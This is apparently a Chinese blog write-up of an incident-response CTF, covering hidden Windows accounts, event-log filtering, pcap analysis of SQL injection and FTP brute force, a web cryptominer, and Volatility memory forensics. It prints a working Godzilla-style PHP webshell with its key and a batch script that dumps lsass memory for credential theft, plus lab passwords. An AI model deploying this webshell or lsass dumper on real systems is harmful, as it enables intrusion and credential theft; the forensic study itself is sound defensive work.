---
title: "2025年Solar应急响应7月月赛"
date: 2026-05-23
lastmod: "2026-05-23T11:37:51+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

## B02-奇怪的加密器
```plain
糟糕！一个客户的服务器的一个文件被加密了，为了防止感染，我将其放入了回收站，请你快点恢复我的flag生成器！这非常重要！！！服务器密码是：qsnctf
```

## 应急大师
### 任务1
```plain
请提交隐藏用户的名称？
```

![](assets/1768809634119-0eb986b6-cae0-468a-8c9d-696449e433b3.png)

何意味，直接显示出来了

![](assets/1768809863322-62d5b556-bd57-4367-9eda-fea7b38f7e23.png)

正常需要到本地用户和组里查看，名字最后有$的是windows里的隐藏用户

```plain
solar$
```

### 任务2
```plain
请提交黑客的IP地址？
```

![](assets/1768810152337-b340d40c-aa01-43ab-94ef-5120ccbd6554.png)

桌面上是phpstudy_pro，那应该就是apache或者nginx的服务，查看对应日志

![](assets/1768810200200-e29c60bf-962f-4fcd-9310-3ede01ee36ed.png)

apache的日志是空的，能再nginx的access.log里找到访问ip

里面总共就3个ip 127.0.0.1是回环地址，192.168.186.1是本地网关，192.168.186.139感觉是跳板机

但这道题感觉就是测试本地靶机的流程，所以答案就是这个ip

```plain
192.168.186.139
```

### 任务3
```plain
请提交黑客的一句话木马密码？
```

接下来查看文件目录

![](assets/1768810078165-23870c81-361c-41ce-8702-64e23b602259.png)

这里看到.htaccess直接想到文件上传，而且还有uploads目录

![](assets/1768810043440-2032c77a-7dca-420c-9662-62199ce9b195.png)

打开php文件发现一句话木马

```plain
solar2025
```

### 任务4
```plain
请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？
```

win11以下可以直接在cmd用wmic命令查看用户的TargetSid

```plain
wmic useraccount where name="solar$" get name,sid
```

![](assets/1768810681255-6f4b591b-e523-4a55-92f0-930c9b8d72c2.png)

```plain
S-1-5-21-3845547894-970975367-1760185533-1000
```

### 任务5
```plain
请提交黑客创建隐藏账户的时间（格式为 年/月/日 时:分:秒）？
```

在windows日志的安全日志里查找任务类别为 **用户账户管理 **的日志

找到创建solar$用户账户的日志

![](assets/1768811170849-189c76ad-4808-4762-ab72-56b0b3ee525c.png)

![](assets/1768811188891-e4237d02-2be4-4677-92ae-7da3bc061fa1.png)

找到用户创建时间

```plain
2025/7/23 17:05:45
```

### 任务6
```plain
黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher
```

接上题，沿时间线继续寻找任务类别为 **安全组管理 **的日志

![](assets/1768811307732-4ddb73f8-483d-4728-8fbe-5240c07e1c2d.png)

找到后发现是先Users后Administrators

![](assets/1768811268634-ea148656-b9d5-4d78-9eab-d677f7199091.png)

![](assets/1768811296878-897d0cfa-15f7-4489-9d04-26c3b11938c4.png)

```plain
Users-Administrators
```

### 任务7
```plain
黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 IP:PORT 如 127.0.0.1:41110
```

依然是通过安全日志里找到

根据5题的时间2025/7/23 17:05:45，继续往后找登录日志

可以直接筛选 **事件ID==4624**

![](assets/1768815021183-f253abca-3814-4de7-956d-95bc7844247f.png)

我们这里不仅需要筛选4624的登录事件，还需要找到xml标签LogonType==10的事件

LogonType==10的登录事件是 远程桌面登录的类型

切换到“XML” 标签，在现有 XML 内容的 `<QueryList>` 内添加筛选条件  

```plain
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[EventID=4624]] and *[EventData[Data[@Name='LogonType']='10']]
    </Select>
  </Query>
</QueryList>
```

![](assets/1768815152715-71fa73db-ae05-42d6-bef2-a31f600fffd7.png)

![](assets/1768815377439-48d0f11e-6c90-4651-9de4-96658ed1c9dc.png)

直接筛选出一条记录

找到连接ip和端口

![](assets/1768815407847-a4c22400-34d0-4c26-ae2c-9fc2f1fb1a98.png)

```plain
192.168.186.139:49197
```

## 公交车系统攻击事件排查
```plain
思而听公交系统被黑客攻击，黑客通过web进行了攻击并获取了数据，然后获取了其中一位驾校师傅在FTP服务中的私密文件，其后黑客找到了任意文件上传漏洞进行了GETshell，控制了主机权限并植入了挖矿网页挖矿病毒，接下来你需要逐步排查。
注意：
流量中的21端口对应2121、80端口对应8090。
root的SSH密码为bussec123，第二个地址是SSH地址。
请勿在此提交FLAG，请前往具体任务提交，如【任务1】公交车系统攻击事件排查 提交。
```

### 任务1
```plain
分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag{zhangsan-wangli}
```

ssh连接后在根目录下发现result1.pcap，里面是服务器流量

![](assets/1768818600479-a9f4f436-bee2-436e-8669-8d1a951b057a.png)

query是注入点，http流84以及之前的都是在测试sql注入方法

最终进行了时间盲注

![](assets/1768818722384-66688c0d-93dd-4870-b538-5bfbe31c9911.png)

这里查看日志发现 在攻击过程中会对数据按条按位进行猜测（此过程中条件使用大于），在找到正确的信息后会使用不等于条件进行验证，因此直接在 `username` 对应字段搜索 `!=` 即可很快找到前两个用户名

```plain
a = [115, 117, 110, 121, 117, 101]
b = [99, 104, 101, 110, 104, 97, 111]
```

转换出来分别是 `sunyue` 与 `chenhao`

```plain
flag{sunyue_chenhao}
```

说实话自己写脚本不如ai

### 任务2
```plain
黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag{xxx}
```

ftp基于tcp传输，可以直接根据端口筛选

注意端口不是21，题目说了端口是2121

![](assets/1768830069709-938f4d01-d369-4333-a920-2baacf6f5d13.png)

追踪tcp流发现在进行爆破

这里爆破了好久，直接往下翻，看到不一样的ip再查看之前的tcp流

![](assets/1768830261486-cac826dc-dc16-4691-a893-f01ec5ef2ec0.png)

最终在7067的tcp流中发现登陆成功的账密

```plain
USER zhangwei
PASS zhangwei123
```

呃呃，但这个和题目没关系

不过爆破完后就是获取私密文件的tcp流了

![](assets/1768830392085-6869c2d9-ee19-4d8a-b2cd-a040c244281e.png)

找到获取的私密文件

![](assets/1768830433270-cd969726-73e1-44e1-bf97-835a42bc5d28.png)

在后一个流中查看到文件内容

```plain
flag{INTERNAL_FTP_ADMIN_PASSWORD=FtpP@ssw0rd_For_Admin_Backup_2025}
```

### 任务3
```plain
可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag{password}
```

上传木马发生在sql注入之后

![](assets/1768821510840-4c3cb532-d3b4-4d41-a554-623053619214.png)

通过访问web页面得知lost_and_found.php存在文件上传漏洞

那就找POST请求这个页面的流量

![](assets/1768821578340-1d2d745f-b1fd-473a-9229-9a11cbcc249b.png)

找到webshell，密码pass=woaiwojia

```plain
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='woaiwojia';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

```plain
flag{woaiwojia}
```

### 任务4
```plain
分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag{xxx.xxx}
```

接上题，观察webshell，其主要分为两部分

第一部分是** 对data进行base64解密 **然后 **用key进行自设的encodeXOR解码**

第二部分是 **eval执行了payload**

事实上这个就是哥斯拉3.x-4.x的流量，可以直接用蓝方工具箱解

![](assets/1769051993475-743dba52-5655-40a5-a1ee-f3842a715eab.png)



重点是data的内容，当对 woaiwojia 之后的内容进行解密后，会发现解出来的内容开头是：

+ `1f 8b 08` —— 这是 **GZIP 压缩**的文件头

也可以大概推断出在`eval($payload)`里执行了`$data`的解压

```plain
import base64, gzip, io
from urllib.parse import unquote_plus

KEY = b"3c6e0b8a9c15224a"

def xor_decode(data: bytes, key: bytes = KEY) -> bytes:
    out = bytearray(data)
    for i, b in enumerate(out):
        out[i] = b ^ key[((i + 1) & 15)]
    return bytes(out)

def decode_post_value(v: str) -> bytes:
    # 1) URL 解码（处理 %2F %3D 和 +）
    v = unquote_plus(v.strip())
    # 2) base64 解码
    raw = base64.b64decode(v)
    # 3) XOR 解密
    dec = xor_decode(raw, KEY)
    # 4) 如果是 gzip 再解压
    if dec.startswith(b"\x1f\x8b\x08"):
        return gzip.decompress(dec)
    return dec

if __name__ == "__main__":
    s = input().strip()
    plain = decode_post_value(s)
    print(plain.decode("utf-8", errors="replace"))

```

![](assets/1768976449942-ef3e1b85-f334-46f9-bf78-0d1c4508fd67.png)

在7102流中找到上传的webshell的原始文件名

![](assets/1768977026613-ce476d7f-d7b9-4b23-9a17-28c4d751d79d.png)

可以看到上传到了index.php，内容是js前端代码，所以利用的是用户资源，然后原始文件名那个是最上方的`map.php`，下题便是解析这段js代码

![](assets/1768976898993-c54afeb0-766c-4859-8d6a-1265534f457f.png)

```plain
flag{map.php}
```

### 任务5
```plain
分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag{xxxxxxx.xxxx.xxx:xxxx}
```

由上题中指出“在用户访问后消耗用户的资源进行挖矿”，可以推断木马代码在前端

网页服务器前端目录位于 `/var/www/html/public`，审计代码中发现 `index.php` 有多余的脚本

![](assets/1768975892737-7ff41c2f-5686-4513-a0cf-d99d7796f115.png)

将其格式化后可以发现其中有一个整数数组，怀疑对应的是字符 ASCII 码

![](assets/1768976102925-0f0d5308-b467-4032-85de-a3ca4882cc32.png)

![](assets/1768976083244-48894b46-a0c5-409c-8456-2aa53f605b58.png)

转化后得到矿池地址`gulf.moneroocean.stream:10128`

```plain
flag{gulf.moneroocean.stream:10128}
```

## VOL_EASY
```plain
某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。请根据题目文件，找出下面10条证据让罪犯服软吧！

附件下载地址：
通过网盘分享的文件：vol_easy.zip
链接: https://pan.baidu.com/s/1afek1JIX8J0tXoPwTSp84g?pwd=w6iu 提取码: w6iu

解压密码：0f6941beab90bc8be5bc25b6c56ee849

注意：
请勿在此提交FLAG，请前往具体任务提交，如【任务1】VOL_EASY 提交。
```

### 任务1
```plain
黑客上传的一句话木马密码是多少？
```

内存取证，上lovelymem和vol2

filescan里检索.php找到ezshell.php.txt

![](assets/1768982774463-ac007019-288a-4318-a548-c71c8c4abb5c.png)

这里给的offset地址是10进制的

用命令的话是16进制的

```plain
volatility_2.6_win64_standalone -f E:\vol_easy\vol_easy.vmem --profile=Win7SP1x64 filescan | findstr /i ezshell
```

![](assets/1768982839440-1c85bb60-e5a2-44d0-9e78-7a0580f0a4ad.png)

dump提取出来

```plain
volatility_2.6_win64_standalone -f E:\vol_easy\vol_easy.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007ddf2280 -D dump
```

![](assets/1768982879367-0fef1a45-9647-4e49-b860-5917292dc90c.png)

用notepad++查看发现一句话木马

![](assets/1768982908630-1df37a4f-02ba-40c2-9081-33ffdb38d603.png)

```plain
solar
```

### 任务2
```plain
黑客使用的木马连接工具叫什么（比如xx.exe）？(仅首字母大写)
```

![](assets/1768977925390-4005e62d-9584-4903-bf2e-32df876bbc14.png)

看到蚁剑还说啥呢，直接试试呗

```plain
Antsword.exe
```

### 任务3
```plain
黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe） ？   
```

接上题

![](assets/1768983029782-38a41dac-ff7d-4d17-86ec-5cfe2d7073f3.png)

```plain
C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe
```

### 任务4
```plain
黑客获取到的FLAG是什么？
```

filescan检索flag在左面上找到flag.txt

![](assets/1768983073300-d4bfeae3-960d-439f-be9e-375388b55c43.png)

用命令导出，可以看到不止一个flag.txt，导出后发现桌面上的那个有flag

```plain
volatility_2.6_win64_standalone -f E:\vol_easy\vol_easy.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007da684a0 -D dump
```

![](assets/1768983237315-8c680a08-72ab-491e-9279-5c2f23913988.png)

![](assets/1768983172108-08a85aa4-7b76-4793-8254-8f4c1d4e6780.png)

```plain
flag{ok!get_webshell_is_good_idea~}
```

### 任务5
```plain
黑客入侵的网站地址是多少（只需要http://xxxxx/）？
```

核心是查看浏览器记录

看进程或者直接从filescan里找都行

进程里能找到ie浏览器

![](assets/1769051532361-0b4201e0-feac-4b16-ae49-6b4fe9886d66.png)

![](assets/1769051547626-dd2c9e98-05f6-45ea-b9d3-069ae82da6b5.png)

然后filescan定位

![](assets/1769052844137-dfbefd65-9b43-4796-aedc-e206cfa9cff2.png)

历史记录在active文件夹下

导出后用010查看

![](assets/1769052883741-e53d6523-413d-4877-bde8-34e8bd174b49.png)

访问了奇怪的php，应该是前面ezshell.php上传后的版本

```plain
http://192.168.186.140/
```

这道题我看别人wp可以直接用lovelymem查看ie浏览器历史记录，不知道怎么弄，我只看到google和edge，可能需要插件

### 任务6
```plain
黑客入侵时，使用的系统用户名是什么？
```

直接试出来是Administrator

```plain
Administrator
```

### 任务7
```plain
黑客创建隐藏账户的密码是多少？
```

这个要找到蚁剑的记录

直接导出蚁剑进程，然后用小工具里的字符串搜索查看

![](assets/1769053562945-69d784b6-e3e5-4b67-9b73-b7e4d396fa24.png)

一般来说创建隐藏用户的命令需要`net user`

![](assets/1769053393894-a1b0124e-d059-42b0-9359-f4a5628547c1.png)

对其进行检索，找到详细命令

![](assets/1769053475925-35af455c-c35a-4b3e-be5a-5b0654cd2de8.png)

因此密码为`solar2025`

```plain
solar2025
```

### 任务8
```plain
黑客首次操作靶机的关键程序是什么？
```

接上题，可以看到在执行net user前还运行了dump_lass.bat脚本，filescan找到该文件

![](assets/1769053903299-b0903b25-ff32-4631-a6df-8fb451ef9cf3.png)

导出后010查看

```plain
@echo off
echo [*] 正在获取 lsass.exe PID...

for /f "tokens=2 delims=," %%a in ('tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV /NH') do (
    set PID=%%~a
)

if "%PID%"=="" (
    echo [!] 未找到 lsass.exe 进程，或没有权限。
    pause
    exit /b 1
)

echo [*] PID: %PID%
echo [*] 正在尝试导出内存转储...

set OUTPUT=%~dp0lsass.dmp

rundll32.exe comsvcs.dll, MiniDump %PID% %OUTPUT% full

if exist "%OUTPUT%" (
    echo [✓] 成功导出 lsass 内存为: %OUTPUT%
) else (
    echo [!] 导出失败，可能权限不足。
)

pause
```

可以发现重要程序`lsass.exe`

```plain
lsass.exe
```

### 任务9
```plain
该关键程序的PID是多少？
```

这个`dump_lass.exe`是蚁剑在远程服务器上执行的，因此`lsass.exe`也是在服务器上执行的

虽然我们拿不到服务器信息，但可以通过蚁剑内存找到pid

导出内存后用小工具或者010检索`lsass.exe`

![](assets/1769054196853-85fe1ac7-9942-421c-900d-bf31d179ce08.png)

PID和存储路径都出来了

```plain
456
```

### 任务10
```plain
该关键程序的内存文件保存到了什么地方？
```

见上题

```plain
C:\phpstudy_pro\WWW\lsass.dmp
```

